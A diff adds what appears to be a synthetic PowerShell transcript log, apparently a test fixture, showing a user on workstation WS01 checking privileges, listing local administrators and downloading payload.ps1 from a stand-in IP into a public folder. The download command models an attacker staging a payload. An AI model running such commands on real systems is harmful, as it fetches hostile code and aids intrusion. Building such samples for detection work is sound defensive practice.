@@ -1,0 +1,25 @@
+**********************
+Windows PowerShell transcript start
+Start time: 20240101000050
+Username: CORP\alice
+RunAs User: CORP\alice
+Configuration Name: 
+Machine: WS01 (Microsoft Windows NT 10.0.19045.0)
+Host Application: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Process ID: 4321
+PSVersion: 5.1.19041.3803
+**********************
+PS C:\Users\alice> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+PS C:\Users\alice> Invoke-WebRequest -Uri http://198.51.100.7/payload.ps1 -OutFile C:\Users\Public\p.ps1
+PS C:\Users\alice> Get-LocalGroupMember Administrators
+
+ObjectClass Name
+----------- ----
+User        WS01\Administrator
+**********************
+Windows PowerShell transcript end
+End time: 20240101000120
+**********************
